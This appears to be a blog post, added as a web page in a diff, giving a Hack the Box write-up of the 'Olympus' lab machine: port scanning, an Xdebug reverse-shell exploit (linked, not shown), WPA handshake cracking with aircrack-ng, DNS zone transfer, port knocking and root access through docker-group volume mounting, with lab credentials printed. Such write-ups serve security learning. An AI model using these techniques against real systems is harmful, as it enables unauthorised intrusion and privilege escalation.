@@ -1,0 +1,440 @@
+<!doctype html><html class="theme-next mist use-motion" lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link href="/assets/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"><link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css"><link href="/assets/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css"><link href="/assets/css/main.css?v=5.1.1" rel="stylesheet" type="text/css"><meta name="keywords" content="writeup,olympus,pentest,hackthebox,"><link rel="alternate" href="/atom.xml" title="fasetto's blog" type="application/atom+xml"><link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico?v=5.1.1"><meta name="robots" content="index, follow"><meta name="description" content="Hi everyone, In this article I’ll show you guys how I pwned Olympus machine on Hack the Box. Lets start.."><link rel="canonical" href="http://fasetto.github.io/hack-the-box-olympus/"><meta name="keywords" content="writeup, olympus, pentest, hackthebox"><meta property="og:type" content="article"><meta property="og:title" content="{Hack the Box} \\ Olympus Write-Up"><meta property="og:url" content="http://fasetto.github.io/hack-the-box-olympus/"><meta property="og:site_name" content="fasetto's blog"><meta property="og:description" content="Hi everyone, In this article I’ll show you guys how I pwned Olympus machine on Hack the Box. Lets start.."><meta property="og:locale" content="en"><meta property="og:image" content="/assets/images/olympus/htb-olympus.png"><meta property="og:image" content="/assets/images/olympus/ctMAzrvXAYYHsqQKgkWvv.png"><meta property="og:image" content="/assets/images/olympus/NuKtO7Shmhm3kY9XFpivR.png"><meta property="og:image" content="/assets/images/olympus/GGHxg1j6TnVSWR1unl5ZL.png"><meta property="og:image" content="/assets/images/olympus/vi3yKoTtNjpVyKKXA24Da.png"><meta property="og:image" content="/assets/images/olympus/yYZzt9rFgRHne3Xxhz2QC.png"><meta property="og:image" content="/assets/images/olympus/r7YpKpJqrzEgVeAwwlZqX.png"><meta property="og:image" content="/assets/images/olympus/FNOIlsW1sjjK7DwVRCwwW.png"><meta property="og:image" content="/assets/images/olympus/6m9G8Eatjc18yG1zrAxdD.png"><meta property="og:image" content="/assets/images/olympus/QHsUB1EOWKPmUfsg0CfcT.png"><meta property="og:image" content="/assets/images/olympus/lZTNC0tYSK7ShGy1981NB.png"><meta property="og:image" content="/assets/images/olympus/ARjmzMZfYnuK02Dy8SxiO.png"><meta property="og:image" content="/assets/images/olympus/XCy8la6s2XDnJ8aM1BzKv.png"><meta property="og:image" content="/assets/images/olympus/UWGSsYw47VtnweuMEwSbN.png"><meta property="og:image" content="/assets/images/olympus/zf4jhAcZOJ1RJuLXF7Tzg.png"><meta property="og:image" content="/assets/images/olympus/Fb6i6t2YgwO5ztA7tHDEj.png"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="{Hack the Box} \\ Olympus Write-Up"><meta name="twitter:description" content="Hi everyone, In this article I’ll show you guys how I pwned Olympus machine on Hack the Box. Lets start.."><meta name="twitter:image" content="/assets/images/olympus/htb-olympus.png"><script type="text/javascript" id="hexo.configurations">var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":true},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };</script><title>{Hack the Box} \\ Olympus Write-Up | fasetto's blog</title><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-125815315-1', 'auto');
+  ga('send', 'pageview');</script></head><body itemscope itemtype="http://schema.org/WebPage" lang="en"><div class="container sidebar-position-left page-post-detail"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">fasetto's blog</span> <span class="logo-line-after"><i></i></span></a></div><p class="site-subtitle">SERKAN (@fasetto)</p></div><div class="site-nav-toggle"><button><span class="btn-bar"></span> <span class="btn-bar"></span> <span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br>Home</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br>Categories</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i><br>About</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br>Archives</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i><br>Tags</a></li><li class="menu-item menu-item-search"><a href="javascript:;" class="popup-trigger"><i class="menu-item-icon fa fa-search fa-fw"></i><br>Search</a></li></ul><div class="site-search"><div class="popup search-popup local-search-popup"><div class="local-search-header clearfix"><span class="search-icon"><i class="fa fa-search"></i> </span><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span><div class="local-search-input-wrapper"><input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input"></div></div><div id="local-search-result"></div></div></div></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><div id="posts" class="posts-expand"><article class="post post-type-" itemscope itemtype="http://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://fasetto.github.io/hack-the-box-olympus/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="fasetto"><meta itemprop="description" content=""><meta itemprop="image" content="/assets/images/avatar-fasetto.jpg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="fasetto's blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">{Hack the Box} \\ Olympus Write-Up</h1><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">Posted on</span> <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-21T00:00:00+03:00">2018-09-21 </time><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-calendar-check-o"></i> </span><span class="post-meta-item-text">Post modified</span> <time title="Post modified" itemprop="dateModified" datetime=""></time> </span><span class="post-category"><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-folder-o"></i> </span><span class="post-meta-item-text">In</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/category/#/write-up" itemprop="url" rel="index"><span itemprop="name">write-up</span> </a></span>, <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/category/#/hackthebox" itemprop="url" rel="index"><span itemprop="name">hackthebox</span> </a></span></span><span class="post-comments-count"><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-comment-o"></i> </span><a href="/hack-the-box-olympus/#comments" itemprop="discussionUrl"><span class="post-comments-count disqus-comment-count" data-disqus-identifier="/hack-the-box-olympus/" itemprop="commentCount"></span></a></span><div class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-clock-o"></i> </span><span class="post-meta-item-text">Reading time</span> <span title="Reading time">10</span></div><div class="post-description"></div></div></header><div class="post-body" itemprop="articleBody"><p><img src="/assets/images/olympus/htb-olympus.png" alt="olympus"></p><h2 id="hi-everyone">Hi everyone,</h2><p>In this article I’ll show you guys how I pwned <strong>Olympus</strong> machine on <a href="https://hackthebox.eu">Hack the Box</a>.<br>Lets start..</p><h2 id="enumeration">Enumeration</h2><p>First thing we need to do is enumerating ports. I will be using <strong>masscan</strong> for quicly enumerating all ports.<br>I recommend you to use this awesome tool.</p><div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10</pre></td><td class="code"><pre class="highlight"><code>root@89e502fff05a:~/pentest/hack-the-box/machines/olympus# masscan -p1-65535 10.10.10.83 --rate=200 -e tun0
+
+Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2018-09-20 16:08:21 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 2222/tcp on 10.10.10.83
+Discovered open port 53/tcp on 10.10.10.83
+Discovered open port 80/tcp on 10.10.10.83
+
+</code></pre></td></tr></tbody></table></div></div><p>There are some ports opened. Lets run <strong>nmap</strong> for more information.</p><div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25</pre></td><td class="code"><pre class="highlight"><code>root@89e502fff05a:~/pentest/hack-the-box/machines/olympus# nmap -sS -sV -sC -p53,80,2222 -o nmap.txt 10.10.10.83
+Nmap scan report for 10.10.10.83
+Host is up (0.074s latency).
+
+PORT     STATE SERVICE VERSION
+53/tcp   open  domain  (unknown banner: Bind)
+| dns-nsid:
+|_  bind.version: Bind
+| fingerprint-strings:
+|   DNSVersionBindReqTCP:
+|     version
+|     bind
+|_    Bind
+80/tcp   open  http    Apache httpd
+|_http-title: Crete island - Olympus HTB
+2222/tcp open  ssh     (protocol 2.0)
+| fingerprint-strings:
+|   NULL:
+|_    SSH-2.0-City of olympia
+| ssh-hostkey:
+|   2048 f2:ba:db:06:95:00:ec:05:81:b0:93:60:32:fd:9e:00 (RSA)
+|   256 79:90:c0:3d:43:6c:8d:72:19:60:45:3c:f8:99:14:bb (ECDSA)
+|_  256 f8:5b:2e:32:95:03:12:a3:3b:40:c5:11:27:ca:71:52 (ED25519)
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+
+</code></pre></td></tr></tbody></table></div></div><p>Apache is running in port 80. We have a web page.<br>Lets check it first.</p><p><img src="/assets/images/olympus/ctMAzrvXAYYHsqQKgkWvv.png" alt="img"></p><p>There is a picture as background of body. I looked the source code of the page and nothing is usefull. So I thought maybe thats a <strong>steganography</strong> challenge ?<br>Downloaded that image and run <strong>steghide</strong> and <strong>binwalk</strong> on it. And I got nothing.<br>And I decided to take a look at the server response, maybe I can find something.</p><p><img src="/assets/images/olympus/NuKtO7Shmhm3kY9XFpivR.png" alt="img"></p><p>Yeah. Thats realy interesting. <strong>Xdebug</strong> is a <strong>PHP</strong> extension for debugging.<br>That header also tells us the version of xdebug. I searched on google and I saw that version has a vulnerabilty.</p><h2 id="exploitation-stage-one">Exploitation (stage-one)</h2><p>I wrote a simple script that drops me a <strong>reverse-shell.</strong></p><script src="https://gist.github.com/fasetto/c057b9154262af2b2d1ef39a08cd13df.js"></script><p><img src="/assets/images/olympus/GGHxg1j6TnVSWR1unl5ZL.png" alt="img"></p><p><img src="/assets/images/olympus/vi3yKoTtNjpVyKKXA24Da.png" alt="img"></p><h2 id="enumeration-from-the-inside">Enumeration from the inside</h2><p>I am <strong>www-data</strong> now. Thats good but I realized that box is actually a <strong>docker container.</strong><br>That means we are not inside the real box. Anyway, I found a <strong>zeus</strong> username in <strong>/etc/passwd</strong> file. I looked the <strong>/home/zeus</strong> dir.<br>I saw <strong>airgeddon</strong> folder, here:</p><div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20</pre></td><td class="code"><pre class="highlight"><code>drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 .
+drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 ..
+-rw-r--r-- 1 zeus zeus    264 Apr  8 00:58 .editorconfig
+drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 .git
+-rw-r--r-- 1 zeus zeus    230 Apr  8 00:58 .gitattributes
+drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 .github
+-rw-r--r-- 1 zeus zeus     89 Apr  8 00:58 .gitignore
+-rw-r--r-- 1 zeus zeus  15855 Apr  8 00:58 CHANGELOG.md
+-rw-r--r-- 1 zeus zeus   3228 Apr  8 00:58 CODE_OF_CONDUCT.md
+-rw-r--r-- 1 zeus zeus   6358 Apr  8 00:58 CONTRIBUTING.md
+-rw-r--r-- 1 zeus zeus   3283 Apr  8 00:58 Dockerfile
+-rw-r--r-- 1 zeus zeus  34940 Apr  8 00:58 LICENSE.md
+-rw-r--r-- 1 zeus zeus   4425 Apr  8 00:58 README.md
+-rw-r--r-- 1 zeus zeus 297711 Apr  8 00:58 airgeddon.sh
+drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 binaries
+drwxr-xr-x 1 zeus zeus   4096 Apr  8 17:31 captured
+drwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 imgs
+-rw-r--r-- 1 zeus zeus  16315 Apr  8 00:58 known_pins.db
+-rw-r--r-- 1 zeus zeus 685345 Apr  8 00:58 language_strings.sh
+-rw-r--r-- 1 zeus zeus     33 Apr  8 00:58 pindb_checksum.txt
+</code></pre></td></tr></tbody></table></div></div><p>That <strong>captured</strong> folder is interesting. I looked inside and:</p><div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br>2<br>3<br>4</pre></td><td class="code"><pre class="highlight"><code>drwxr-xr-x 1 zeus zeus   4096 Apr  8 17:31 .
+drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 ..
+-rw-r--r-- 1 zeus zeus 297917 Apr  8 12:48 captured.cap
+-rw-r--r-- 1 zeus zeus     57 Apr  8 17:30 papyrus.txt
+</code></pre></td></tr></tbody></table></div></div><h4 id="papyrustxt">papyrus.txt</h4><div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>Captured while flying. I'll banish him to Olympia - Zeus
+</code></pre></td></tr></tbody></table></div></div><p>That message maybe could help later.</p><h4 id="capturedcap">captured.cap</h4><p>I copied that file using netcat. When you transfering something always make sure the file is not broken, check the <strong>md5sum</strong>.</p><p><img src="/assets/images/olympus/yYZzt9rFgRHne3Xxhz2QC.png" alt="img"></p><p><img src="/assets/images/olympus/r7YpKpJqrzEgVeAwwlZqX.png" alt="img"></p><p>I dedided to crack the file.</p><p><img src="/assets/images/olympus/FNOIlsW1sjjK7DwVRCwwW.png" alt="img"></p><div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>aircrack-ng captured.cap -w ~/pentest/wordlist/rockyou.txt
+</code></pre></td></tr></tbody></table></div></div><p><img src="/assets/images/olympus/6m9G8Eatjc18yG1zrAxdD.png" alt="img"></p><p>SSID: <strong>Too_cl0se_to_th3_Sun</strong> noted.<br>After 20-30 mins later <strong>aircrack-ng</strong> cracked the file.<br>The password is <strong>flightoficarus</strong></p><h2 id="stage-two">Stage Two</h2><p>I tried to connect to the machine using <strong>ssh</strong> with username <strong>zeus</strong> and passwords I found, but didn’t worked.<br>Than I thought, I know I am in a <strong>docker container.</strong> There isn’t another user on that container. There must be another container or actual box itself.<br>So I tried with username <strong>icarus</strong> and passwords I found. It worked.<br><strong>icarus</strong> is the right username, and the password is <strong>Too_cl0se_to_th3_Sun</strong></p><div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>ssh icarus@10.10.10.83 -p 2222
+</code></pre></td></tr></tbody></table></div></div><p><img src="/assets/images/olympus/QHsUB1EOWKPmUfsg0CfcT.png" alt="img"></p><h2 id="enumeration-1">Enumeration</h2><p>Found something interesting again. <strong>ctfolympus.htb</strong><br>Lets add this domain in our <strong>/etc/hosts</strong> file.</p><p>I already checked that <strong>dns service</strong> I found earlier with <strong>nmap.</strong><br>But I didn’t find anything. Lets check again.</p><div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25</pre></td><td class="code"><pre class="highlight"><code>root@89e502fff05a:~# dig axfr @10.10.10.83 ctfolympus.htb
+
+; &lt;&lt;&gt;&gt; DiG 9.11.4-4-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.83 ctfolympus.htb
+; (1 server found)
+;; global options: +cmd
+ctfolympus.htb.		86400	IN	SOA	ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
+ctfolympus.htb.		86400	IN	TXT	"prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
+ctfolympus.htb.		86400	IN	A	192.168.0.120
+ctfolympus.htb.		86400	IN	NS	ns1.ctfolympus.htb.
+ctfolympus.htb.		86400	IN	NS	ns2.ctfolympus.htb.
+ctfolympus.htb.		86400	IN	MX	10 mail.ctfolympus.htb.
+crete.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
+hades.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
+mail.ctfolympus.htb.	86400	IN	A	192.168.0.120
+ns1.ctfolympus.htb.	86400	IN	A	192.168.0.120
+ns2.ctfolympus.htb.	86400	IN	A	192.168.0.120
+rhodes.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
+RhodesColossus.ctfolympus.htb. 86400 IN	TXT	"Here lies the great Colossus of Rhodes"
+www.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
+ctfolympus.htb.		86400	IN	SOA	ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
+;; Query time: 79 msec
+;; SERVER: 10.10.10.83#53(10.10.10.83)
+;; WHEN: Fri Sep 21 15:06:00 UTC 2018
+;; XFR size: 15 records (messages 1, bytes 475)
+
+</code></pre></td></tr></tbody></table></div></div><p>This message looks interesting..</p><div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>"prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
+</code></pre></td></tr></tbody></table></div></div><p>As I could understand there is another place to go. <strong>3456, 8234, 62431</strong> these numbers also weird.<br><strong>prometheus</strong> must be a username, <strong>St34l_th3_F1re!</strong> must be password. I tried with ssh again but didn’t worked.<br>I was stucked here. But my friend <strong>Kunal</strong> told me about <strong>port-knocking.</strong></p><p>I searched on google and found these great articles.</p><blockquote><p>https://www.digitalocean.com/community/tutorials/how-to-use-port-knocking-to-hide-your-ssh-daemon-from-attackers-on-ubuntu<br>https://www.bgasecurity.com/2014/05/port-knocking-yontemi-ile-portlar/</p></blockquote><p>Basicly the <strong>port 22</strong> is opened but <strong>hidden</strong>. We can’t access directly. But if we knock specific ports in a particular order, <strong>knockd</strong> service catch that <strong>sequence</strong> and allow us to connect.<br>Doen’t matter if that ports closed or not.</p><h2 id="stage-three">Stage three</h2><div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>apt install knockd
+</code></pre></td></tr></tbody></table></div></div><div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br>2</pre></td><td class="code"><pre class="highlight"><code>root@89e502fff05a:~# knock ctfolympus.htb 3456 8234 62431 &amp;&amp; ssh prometheus@ctfolympus.htb
+prometheus@ctfolympus.htb's password: St34l_th3_F1re!
+</code></pre></td></tr></tbody></table></div></div><p><img src="/assets/images/olympus/lZTNC0tYSK7ShGy1981NB.png" alt="img"></p><p>In the <strong>home</strong> folder of <strong>prometheus</strong> there is a message from gods.<br>That message I think useless.</p><p><img src="/assets/images/olympus/ARjmzMZfYnuK02Dy8SxiO.png" alt="img"></p><p>I’m in <strong>docker</strong> users group. Thats important.<br>Lets have a look at <strong>docker images</strong> and <strong>containers.</strong></p><p><img src="/assets/images/olympus/XCy8la6s2XDnJ8aM1BzKv.png" alt="img"></p><h2 id="getting-root">Getting root</h2><p>I want root flag, right ?<br>Docker allow us to share our data between our machine and docker containers. So all I need to do is bind the <strong>/root</strong> partition and I can read what I want..</p><div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>docker run --rm -it -v /root:/pwned olympia /bin/bash
+</code></pre></td></tr></tbody></table></div></div><p>It will create new container and execute the <strong>/bin/bash</strong> for us. <strong>–rm</strong> flag means delete the container when we exit.</p><p><img src="/assets/images/olympus/UWGSsYw47VtnweuMEwSbN.png" alt="img"></p><p>Or we could use like this for just grab the flag..</p><div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>docker run --rm -it -v /root:/pwned olympia /bin/bash -c "/bin/cat /pwned/root.txt"
+</code></pre></td></tr></tbody></table></div></div><p><img src="/assets/images/olympus/zf4jhAcZOJ1RJuLXF7Tzg.png" alt="img"></p><p>Almost forgot, I wanna show you guys how <strong>knockd</strong> daemon configured on this machine. Check this.</p><p><img src="/assets/images/olympus/Fb6i6t2YgwO5ztA7tHDEj.png" alt="img"></p><p>Thats it for <strong>Olympus.</strong> I learned a few things from this machine.<br>If you have a question or something you can leave a comment.<br>See you guys later.</p></div><div></div><div></div><div></div><footer class="post-footer"><div class="post-tags"><a href="/tag/#/writeup" rel="tag"># writeup</a> <a href="/tag/#/olympus" rel="tag"># olympus</a> <a href="/tag/#/pentest" rel="tag"># pentest</a> <a href="/tag/#/hackthebox" rel="tag"># hackthebox</a></div><div class="post-nav" id="post-nav-id"><div class="post-nav-next post-nav-item"></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"><a href="/hack-the-box-canape/" rel="prev" title="{Hack the Box} \\ Canape Write-Up">{Hack the Box} \\ Canape Write-Up <i class="fa fa-chevron-right"></i></a></div></div></footer></article><div class="post-spread"></div></div></div><div class="comments" id="comments"><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span> <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span> <span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">Table of Contents</li><li class="sidebar-nav-overview" data-target="site-overview">Overview</li></ul><section class="site-overview sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" src="/assets/images/avatar-fasetto.jpg" alt="fasetto"><p class="site-author-name" itemprop="name">fasetto</p><p class="site-description motion-element" itemprop="description">Full Stack Developer, UI & UX Designer</p></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">5</span> <span class="site-state-item-name">posts</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">10</span> <span class="site-state-item-name">categories</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">11</span> <span class="site-state-item-name">tags</span></a></div></nav><div class="feed-link motion-element"><a href="/atom.xml" rel="alternate"><i class="fa fa-rss"></i> RSS</a></div><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/fasetto" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i> GitHub </a></span><span class="links-of-author-item"><a href="https://www.reddit.com/user/imfasetto" target="_blank" title="Reddit"><i class="fa fa-fw fa-reddit-alien"></i> Reddit </a></span><span class="links-of-author-item"><a href="https://stackoverflow.com/users/9648420/serkan" target="_blank" title="StackOverFlow"><i class="fa fa-fw fa-globe"></i> StackOverFlow </a></span><span class="links-of-author-item"><a href="mailto:serkanbircan21@yandex.com" target="_blank" title="Email"><i class="fa fa-fw fa-envelope"></i> Email </a></span><span class="links-of-author-item"><a href="https://dribbble.com/fasetto" target="_blank" title="Dribble"><i class="fa fa-fw fa-dribbble"></i> Dribble </a></span><span class="links-of-author-item"><a href="https://www.linkedin.com/in/fasetto/" target="_blank" title="LinkedIn"><i class="fa fa-fw fa-linkedin-square"></i> LinkedIn</a></span></div></section><section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"><div class="post-toc"><div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#hi-everyone"><span class="nav-text">Hi everyone,</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#enumeration"><span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploitation-stage-one"><span class="nav-text">Exploitation (stage-one)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#enumeration-from-the-inside"><span class="nav-text">Enumeration from the inside</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#papyrustxt"><span class="nav-text">papyrus.txt</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#capturedcap"><span class="nav-text">captured.cap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-two"><span class="nav-text">Stage Two</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#enumeration-1"><span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-three"><span class="nav-text">Stage three</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getting-root"><span class="nav-text">Getting root</span></a></li></ol></div></div></section></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2018</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">fasetto</span></div><div class="powered-by">Powered by <a class="theme-link" href="https://jekyllrb.com">Jekyll</a></div><div class="theme-info">Theme - <a class="theme-link" href="https://github.com/simpleyyt/jekyll-theme-next">NexT.Mist</a></div></div></footer><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span id="scrollpercent"><span>0</span>%</span></div></div><script type="text/javascript">if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }</script><script type="text/javascript" src="/assets/lib/jquery/index.js?v=2.1.3"></script><script type="text/javascript" src="/assets/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script><script type="text/javascript" src="/assets/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script><script type="text/javascript" src="/assets/lib/velocity/velocity.min.js?v=1.2.1"></script><script type="text/javascript" src="/assets/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script type="text/javascript" src="/assets/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script><script type="text/javascript" src="/assets/js/src/utils.js?v=5.1.1"></script><script type="text/javascript" src="/assets/js/src/motion.js?v=5.1.1"></script><script type="text/javascript" src="/assets/js/src/scrollspy.js?v=5.1.1"></script><script type="text/javascript" src="/assets/js/src/post-details.js?v=5.1.1"></script><script type="text/javascript" src="/assets/js/src/bootstrap.js?v=5.1.1"></script><script id="dsq-count-scr" src="https://fasetto-github-io.disqus.com/count.js" async></script><script type="text/javascript">var disqus_config = function () {
+              this.page.url = 'http://fasetto.github.io/hack-the-box-olympus/';
+              this.page.identifier = '/hack-the-box-olympus/';
+              this.page.title = '{Hack the Box} \\ Olympus Write-Up';
+          };
+          var d = document, s = d.createElement('script');
+          s.src = 'https://fasetto-github-io.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', '' + +new Date());
+          (d.head || d.body).appendChild(s);</script><script type="text/javascript">// Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
